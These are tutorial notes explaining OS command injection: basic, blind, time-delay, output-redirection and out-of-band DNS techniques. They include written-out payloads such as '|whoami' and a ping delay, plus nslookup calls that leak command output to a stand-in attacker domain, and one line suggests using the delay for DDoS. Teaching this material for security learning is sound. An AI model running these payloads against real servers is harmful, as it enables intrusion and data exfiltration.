# OS command injection
```
OS command injection (also known as shell injection) is a web security vulnerability that allows an attacker to execute arbitrary 
operating system (OS) commands on the server that is running an application, and typically fully compromise the application and all its data
```
```
https://insecure-website.com/stockStatus?productID=381&storeID=29
```
1. Lets take the above url as an example here the ProductID and StoreID are called using the backend OS commands
2. If the application implements no defenses against OS command injection, an attacker can submit the following input to execute an arbitrary command:
```
& echo aiwefwlguh &
```
3. Here echo is an os command which is used to read out 'aiwefwlguh' and & is usewde as an shell command separator. 
4. now if we change the above url to: 
```
https://insecure-website.com/stockStatus?productID=381&storeID=1|whoami
or
https://insecure-website.com/stockStatus?productID=381&storeID=1|echo Hello
```
5. Then the Vulnerable Application executes the StoreID's expected  **1** value and also the **echo/whoami** command which we supplied, at the same time  

## Blind OS command injection vulnerabilities
1. Many instances of OS command injection are blind vulnerabilities. This means that the application does not return the output from the command within its HTTP response.
2. so Generally we Find a parameter that will reflect the user supplied data in the Server Side and try to make a Time Delay attack
```
Lets take an email parameter email=happy@gmail.com
payload used:-ping -c 10 127.0.0.1
final cmd:- email=x||ping+-c+10+127.0.0.1||
This will create a 10s time delay so if the cmd works then we can put mallicious DDOS attacks through it 
```

## Exploiting blind OS command injection by redirecting output
```
1. Modify the email parameter, changing it to: email=||whoami>/var/www/images/output.txt||
2. then go to the application and capture the request where the image of a product loads
3. change the filename parameter to output.txt
```

## Exploiting blind OS command injection using out-of-band (OAST) techniques
Use the same Technique this tim ewe will be using Burp collaborator or any own website where we can monitor the DNS requests
```
& nslookup kgji2ohoyw.web-attacker.com &
```
The out-of-band channel also provides an easy way to exfiltrate the output from injected commands:
```
& nslookup `whoami`.kgji2ohoyw.web-attacker.com &
```

This will cause a DNS lookup to the attacker's domain containing the result of the whoami command:
```
wwwuser.kgji2ohoyw.web-attacker.com
```

References:-
1. https://hackerone.com/reports/685447
